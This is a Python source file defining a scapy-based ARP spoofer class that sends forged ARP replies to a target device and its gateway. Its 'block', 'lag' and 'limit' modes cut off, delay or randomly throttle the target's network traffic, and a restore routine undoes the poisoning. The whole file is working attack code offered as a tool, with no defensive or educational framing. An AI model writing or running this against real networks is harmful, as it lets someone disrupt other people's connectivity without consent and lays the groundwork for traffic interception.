import random
import threading
import time

from scapy.all import ARP, Ether, conf, sendp


class ARPSpoofer:

    def __init__(self, iface: str | None = None):
        self._iface  = iface or conf.route.route("0.0.0.0")[0]
        self._lock   = threading.Lock()
        self._tokens: dict[str, int] = {}

    # ── public API ────────────────────────────────────────────────────────────

    def apply(self, target_ip, target_mac, gateway_ip, gateway_mac,
              mode="block", intensity=60):
        with self._lock:
            token = self._tokens.get(target_ip, 0) + 1
            self._tokens[target_ip] = token
        threading.Thread(
            target=self._loop,
            args=(token, target_ip, target_mac, gateway_ip, gateway_mac, mode, intensity),
            daemon=True,
        ).start()

    def remove(self, target_ip, target_mac, gateway_ip, gateway_mac):
        with self._lock:
            self._tokens.pop(target_ip, None)
        threading.Thread(
            target=self._do_restore,
            args=(target_ip, target_mac, gateway_ip, gateway_mac),
            daemon=True,
        ).start()

    def remove_all(self, devices, gateway_ip, gateway_mac):
        with self._lock:
            ips = list(self._tokens.keys())
            self._tokens.clear()
        for dev in devices:
            if dev["ip"] in ips:
                self._do_restore(dev["ip"], dev["mac"], gateway_ip, gateway_mac)

    def is_active(self, target_ip):
        return target_ip in self._tokens

    def get_mode(self, target_ip):
        return "active" if target_ip in self._tokens else "normal"

    # ── loop ─────────────────────────────────────────────────────────────────

    def _loop(self, token, target_ip, target_mac, gateway_ip, gateway_mac,
              mode, intensity):

        def alive():
            return self._tokens.get(target_ip) == token

        while alive():
            if mode == "block":
                self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
                time.sleep(0.5)

            elif mode == "lag":
                block_t = 0.3 + (intensity / 100) * 2.7
                allow_t = 0.5 - (intensity / 100) * 0.45

                t0 = time.time()
                while alive() and time.time() - t0 < block_t:
                    self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
                    time.sleep(0.1)

                if not alive():
                    break

                self._poison_off(target_ip, target_mac, gateway_ip, gateway_mac)
                time.sleep(allow_t)

            elif mode == "limit":
                if random.randint(1, 100) <= intensity:
                    self._poison(target_ip, target_mac, gateway_ip, gateway_mac)
                else:
                    self._poison_off(target_ip, target_mac, gateway_ip, gateway_mac)
                time.sleep(0.2)

    # ── ARP ───────────────────────────────────────────────────────────────────

    def _poison(self, target_ip, target_mac, gateway_ip, gateway_mac):
        try:
            sendp([
                Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip),
                Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
            ], iface=self._iface, verbose=0)
        except Exception as e:
            print(f"[spoofer] poison error: {e}")

    def _poison_off(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """Send correct ARPs for lag/limit allow window — quick, 2 packets."""
        self._send_restore(target_ip, target_mac, gateway_ip, gateway_mac, count=2)

    def _do_restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """Wait for last poison to clear, then flood correct ARPs."""
        time.sleep(1.0)   # outlast the 0.5s poison interval
        for _ in range(5):
            self._send_restore(target_ip, target_mac, gateway_ip, gateway_mac, count=10)
            time.sleep(0.4)

    def _send_restore(self, target_ip, target_mac, gateway_ip, gateway_mac, count=10):
        if not target_mac or not gateway_mac:
            return
        try:
            sendp([
                Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,
                                              psrc=gateway_ip, hwsrc=gateway_mac),
                Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                                              psrc=target_ip,  hwsrc=target_mac),
            ], iface=self._iface, verbose=0, count=count)
        except Exception as e:
            print(f"[spoofer] restore error: {e}")
